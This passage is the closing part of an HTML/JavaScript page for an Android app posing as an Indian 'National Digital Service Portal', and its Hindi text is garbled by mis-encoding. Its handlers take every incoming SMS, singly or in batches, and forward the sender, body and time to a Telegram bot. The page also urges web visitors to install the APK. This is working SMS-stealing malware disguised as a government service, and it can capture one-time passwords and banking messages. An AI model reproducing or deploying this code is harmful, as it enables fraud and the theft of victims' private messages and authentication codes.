                        text: `üì± *‡§®‡§Ø‡§æ SMS ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§*\n\nüìû *‡§™‡•ç‡§∞‡•á‡§∑‡§ï:* ${sender}\nüí¨ *‡§∏‡§Ç‡§¶‡•á‡§∂:* ${message}\n‚è∞ *‡§∏‡§Æ‡§Ø:* ${new Date(parseInt(timestamp)).toLocaleString('hi-IN')}\n\nüáÆüá≥ ‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤`,
                        parse_mode: 'Markdown'
                    })
                }).catch(err => console.log('Telegram send error:', err));
            }
        };
        
        window.onSmsBatch = function(smsList) {
            try {
                const smsArray = JSON.parse(smsList);
                smsArray.forEach(sms => {
                    window.onSmsReceived(sms.sender, sms.body, sms.timestamp);
                });
            } catch (e) {
                console.log('SMS batch error:', e);
            }
        };

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            // Check if running in APK mode
            apkMode = APK_INTERFACE.isApkMode();
            
            if (apkMode) {
                console.log('üöÄ Running in APK mode');
                document.getElementById('apkStatus').innerHTML = `
                    <span class="status-badge bg-success">
                        <i class="fas fa-check-circle"></i> APK Mode Active
                    </span>
                `;
                
                // Auto-request permission on load (optional)
                // setTimeout(() => requestSMSPermission(), 1000);
            } else {
                console.log('üåê Running in web browser');
                document.getElementById('apkStatus').innerHTML = `
                    <span class="status-badge bg-warning">
                        <i class="fas fa-globe"></i> Web Mode
                    </span>
                `;
                
                const statusDiv = document.getElementById('permissionStatus');
                statusDiv.innerHTML = `
                    <p style="color: var(--blue);">
                        <i class="fas fa-info-circle"></i> 
                        ‡§ï‡•É‡§™‡§Ø‡§æ APK ‡§á‡§Ç‡§∏‡•ç‡§ü‡•â‡§≤ ‡§ï‡§∞‡•á‡§Ç
                    </p>
                `;
            }
            
            // Check if already have Telegram config
            if (!TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
                console.log('‚úÖ Telegram configured');
            } else {
                console.log('‚ö†Ô∏è Telegram not configured');
                showTelegramWarning();
            }
        });
    </script>
</body>
</html>
